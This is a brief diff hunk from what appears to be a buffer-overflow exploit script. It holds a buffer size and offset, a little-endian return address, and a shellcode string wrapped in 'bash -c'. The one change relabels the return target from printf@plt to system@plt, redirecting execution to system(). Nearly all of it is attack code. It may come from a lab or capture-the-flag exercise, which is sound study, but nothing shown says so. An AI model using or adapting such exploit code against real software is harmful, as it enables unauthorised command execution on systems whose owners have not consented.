@@ -15,7 +15,7 @@ shellcode =  'bash -c "' + shellcode + '" #'
 buf_size = 256 
 offset = 264
 
-# printf@plt 
+# system@plt 
 ret_addr = "\x40\x07\xb0"[::-1]
 
 # NOP
